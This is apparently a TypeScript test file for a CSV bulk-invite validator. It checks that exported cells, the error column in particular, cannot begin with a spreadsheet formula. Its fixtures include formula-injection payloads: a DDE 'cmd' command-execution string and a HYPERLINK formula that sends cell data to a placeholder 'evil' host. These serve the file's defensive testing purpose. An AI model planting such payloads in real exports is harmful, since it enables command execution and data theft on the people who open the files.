// ── ⚠ CSV FORMULA INJECTION ──────────────────────────────────────────────────────────────
//
// The requirement is that every field is parsed or filtered against SQL injection. The honest
// answer is that there is NO SQL on this path, the services store in DynamoDB (every expression
// binds its values through `ExpressionAttributeValues`; the only interpolated parts are attribute
// NAMES from a hardcoded list or a zod-validated schema) and the desktop's SQLite is parameterised
// throughout.
//
// ⚠ BUT THE EQUIVALENT RISK FOR THIS FEATURE IS REAL, AND IT IS WORSE THAN IT LOOKS. To a
// spreadsheet a CSV is not data, it is a program: a cell starting `=`, `+`, `-`, `@`, TAB or CR is
// evaluated as a FORMULA. The failure report hands the operator's own rows back as a CSV they then
// open in Excel, so a team named `=cmd|'/c calc'!A0` is code execution on the facilitator's machine
//, triggered by them doing the obvious thing with a file the product gave them.
//
// ⚠ AND THE FACILITATOR IS NOT THE ATTACKER. They may be pasting a roster somebody else sent them,
// so the hostile cell arrives without anyone in the chain intending it. That is what makes this a
// control rather than a nicety.

import { describe, it, expect } from "vitest";
import { csvCell } from "./contract";
import { buildAnnotatedCsv } from "./report";
import { validateBulkCsv } from "./validate";

const HEADER = "team_name,email,platform_role,team_role";

describe("⚠ csvCell neutralises a formula without destroying the value", () => {
  /**
   * The four DDE/formula lead characters plus the two whitespace ones Excel also treats as leads.
   * `-` matters as much as `=`: `-1+1` is arithmetic, and `-2+3+cmd|...` is a documented DDE vector.
   */
  it.each(["=1+1", "+1", "-1+1", "@SUM(A1)", "\tX", "\rX"])("prefixes %j", (input) => {
    const out = csvCell(input);
    // A leading apostrophe is not displayed by a spreadsheet, so the value still READS correctly.
    expect(out.replace(/^"/, "").startsWith("'")).toBe(true);
  });

  it.each([
    ['=HYPERLINK("http://evil/?"&A1,"x")', "exfiltration via a link"],
    ["=cmd|'/c calc'!A0", "DDE command execution"],
    ["@SUM(1+9)*cmd|'/c calc'!A0", "the @ variant"],
  ])("neutralises the real-world payload %j (%s)", (payload) => {
    const out = csvCell(payload);
    // The payload survives as TEXT, nothing is stripped, but it can no longer lead a formula.
    expect(out).toContain(payload.replace(/"/g, '""'));
    expect(/^"?'/.test(out)).toBe(true);
  });

  /**
   * ⚠ PREFIXING, NOT STRIPPING, and this is the test that pins WHY. A team genuinely called
   * "+1 Crew" must survive intact; stripping the `+` would silently rename someone's team, which is
   * a data-corruption bug introduced in the name of security.
   */
  it("preserves a legitimate value that happens to start with +", () => {
    expect(csvCell("+1 Crew")).toBe("'+1 Crew");
  });

  it("leaves an ordinary value completely alone", () => {
    expect(csvCell("Team Aurora")).toBe("Team Aurora");
  });

  /**
   * Quoting and prefixing solve DIFFERENT problems and both must happen: quoting protects the
   * PARSER (a comma would split the cell), prefixing protects the SPREADSHEET.
   */
  it("also applies RFC 4180 quoting, doubling embedded quotes", () => {
    expect(csvCell('a,b')).toBe('"a,b"');
    expect(csvCell('say "hi"')).toBe('"say ""hi"""');
    expect(csvCell("line\nbreak")).toBe('"line\nbreak"');
  });

  it("quotes AND prefixes when a value needs both", () => {
    const out = csvCell('=A1,"x"');
    expect(out.startsWith('"\'')).toBe(true);
    expect(out.endsWith('"')).toBe(true);
  });
});

describe("⚠ the error report cannot become a formula", () => {
  /**
   * THE ASSERTION THAT MATTERS MOST IN THIS FILE. The `error` column is built from message text that
   * ECHOES CELL VALUES, a rejected role, an unknown column name, so it is a path from the
   * operator's file into a brand-new cell whose position the report controls.
   */
  /**
   * ⚠ THE PROPERTY IS "THE ERROR CELL NEVER *BEGINS* WITH A FORMULA CHARACTER", and it holds by TWO
   * independent mechanisms, which is worth pinning precisely, because my first version of this test
   * asserted the wrong one and failed.
   *
   * I expected the guard to fire. It does not: every message is built as `${column}: ${message}`, so
   * the cell always begins with a column name, and the echoed hostile value sits MID-STRING where it
   * is inert (formula evaluation needs the FIRST character). So `csvCell` here is defence in depth
   * that currently never triggers.
   *
   * Both facts are load-bearing and neither is obvious, so both are asserted: the message shape
   * could change, and if it ever starts with echoed content the guard is what catches it.
   */
  it("never lets the error cell BEGIN with a formula character", () => {
    const file = [HEADER, "Team A,a@example.com,=cmd|'/c calc'!A0,"].join("\n");
    const result = validateBulkCsv(file);
    expect(result.valid).toBe(false);
    if (result.valid) return;

    const csv = buildAnnotatedCsv(file, result.errors);
    const errorCell = csv.split("\n")[1].split(",").slice(4).join(",").replace(/^"/, "");

    // The actual safety property, however it is achieved.
    expect(/^[=+\-@\t\r]/.test(errorCell)).toBe(false);
    // And the mechanism that achieves it today: the column name leads.
    expect(errorCell.startsWith("platform_role")).toBe(true);
    // The payload IS echoed, inert because of where it sits, not because it was stripped.
    // Case-insensitive: `platform_role` is normalised with `.toUpperCase()` before validation, so the
    // echoed value arrives upper-cased. Incidental, not a security control.
    expect(errorCell.toLowerCase()).toContain("calc");
  });

  it("⚠ and the guard DOES fire if a message ever leads with echoed content", () => {
    // Pinning the fallback directly, since the test above proves it is currently dormant. If someone
    // reformats the messages to lead with the offending value, this is what still holds.
    expect(csvCell("=cmd|'/c calc'!A0 is not a valid role").startsWith("'")).toBe(true);
  });

  it("annotates the failing line and leaves good lines with an empty error cell", () => {
    const file = [HEADER, "Team A,a@example.com,PARTICIPANT,", "Team B,bad,PARTICIPANT,"].join("\n");
    const result = validateBulkCsv(file);
    if (result.valid) throw new Error("expected invalid");

    const lines = buildAnnotatedCsv(file, result.errors).split("\n");
    expect(lines[0]).toBe(`${HEADER},error`);
    expect(lines[1]).toBe("Team A,a@example.com,PARTICIPANT,,");
    expect(lines[2]).toContain("email:");
  });

  it("reports EVERY error on one line, not just the first", () => {
    // A row can be wrong twice; fixing one and re-uploading to discover the other is a bad loop.
    const file = [HEADER, "Team A,bad-email,NOPE,"].join("\n");
    const result = validateBulkCsv(file);
    if (result.valid) throw new Error("expected invalid");

    const row = buildAnnotatedCsv(file, result.errors).split("\n")[1];
    expect(row).toContain("email:");
    expect(row).toContain("platform_role:");
    expect(row).toContain("|");
  });

  /**
   * ⚠ THE ORIGINAL LINE IS PASSED THROUGH VERBATIM. Re-escaping it would corrupt the operator's own
   * quoting, and it adds no exposure: that content is what they uploaded and already have on disk.
   * The guard is for the column the REPORT creates.
   */
  it("does not re-quote the operator's own line", () => {
    const file = [HEADER, '"Team, Comma",a@example.com,PARTICIPANT,'].join("\n");
    const result = validateBulkCsv(file);
    // This file is valid, so annotate with no errors, the round-trip must be lossless.
    const csv = buildAnnotatedCsv(file, []);
    expect(csv).toContain('"Team, Comma",a@example.com,PARTICIPANT,,');
    expect(result.valid).toBe(true);
  });

  it("passes comment and blank lines through untouched, so the template round-trips", () => {
    const file = ["# aiap-bulk-invite v1", "", HEADER, "Team A,a@example.com,PARTICIPANT,"].join("\n");
    const csv = buildAnnotatedCsv(file, []);
    expect(csv.split("\n")[0]).toBe("# aiap-bulk-invite v1");
    expect(csv.split("\n")[1]).toBe("");
  });

  it("keeps a line the PARSER could not read, with its error beside it", () => {
    // Re-parsing to rebuild the file would drop exactly the rows most in need of annotation.
    const file = [HEADER, '"Team A,a@example.com,PARTICIPANT,'].join("\n");
    const result = validateBulkCsv(file);
    if (result.valid) throw new Error("expected invalid");

    const row = buildAnnotatedCsv(file, result.errors).split("\n")[1];
    expect(row).toContain('"Team A,a@example.com');
    expect(row.toLowerCase()).toContain("quote");
  });
});

describe("what the parser does with hostile-looking input generally", () => {
  /**
   * A formula in a team name is not a VALIDATION error, it is a legal team name. The guard belongs
   * at the output boundary, not the input one: refusing it would block a team called "+1 Crew" while
   * doing nothing about the report, which is where the danger actually is.
   */
  it("accepts a formula-looking team name as data, rather than refusing it", () => {
    const result = validateBulkCsv([HEADER, "=1+1,a@example.com,PARTICIPANT,"].join("\n"));
    expect(result.valid).toBe(true);
  });

  it("does not execute, evaluate, or transform any cell content", () => {
    const result = validateBulkCsv([HEADER, "=1+1,a@example.com,PARTICIPANT,"].join("\n"));
    if (!result.valid) throw new Error("expected valid");
    // Stored verbatim: "=1+1", never "2".
    expect(result.plan.teams[0].teamName).toBe("=1+1");
  });

  /**
   * ⚠ WHAT THIS LAYER DOES *NOT* GUARANTEE, ASSERTED HONESTLY RATHER THAN OVERCLAIMED.
   *
   * I expected `a<b@example.com` to be rejected and wrote a test saying so. It is NOT, the checks
   * are structural (one `@`, no whitespace, no comma, a dot in the domain) and an angle bracket
   * violates none of them.
   *
   * That is acceptable, and the reason is worth recording rather than "fixing" by bolting on a
   * character denylist:
   *
   *   1. The address ends up in an EMAIL, and `notify` HTML-escapes every `{{ }}` slot, its raw
   *      `{{{ }}}` slots fail safe by escaping anything not explicitly marked trusted
   *      (`the notify service's `render.ts``). So markup in an address cannot inject there.
   *   2. Cognito is the real authority on what is a usable username and rejects it at provisioning,
   *      which is reported per-address rather than failing the batch.
   *
   * A denylist here would be a second, weaker copy of a decision two other layers already make
   * correctly, and the classic "comprehensive email regex" is itself a backtracking DoS on
   * untrusted input, which is why this module deliberately does not have one.
   */
  it("does NOT reject every odd character, and that is deliberate, not an oversight", () => {
    const r = validateBulkCsv([HEADER, "Team A,a<b@example.com,PARTICIPANT,"].join("\n"));
    expect(r.valid, "structural checks alone let this through").toBe(true);
  });

  it("does reject what it actually claims to: whitespace, commas, missing @, no dot", () => {
    for (const bad of ["a b@example.com", "nope", "a@@example.com", "a@localhost"]) {
      const r = validateBulkCsv([HEADER, `Team A,${bad},PARTICIPANT,`].join("\n"));
      expect(r.valid, `${bad} should be rejected`).toBe(false);
    }
  });
});
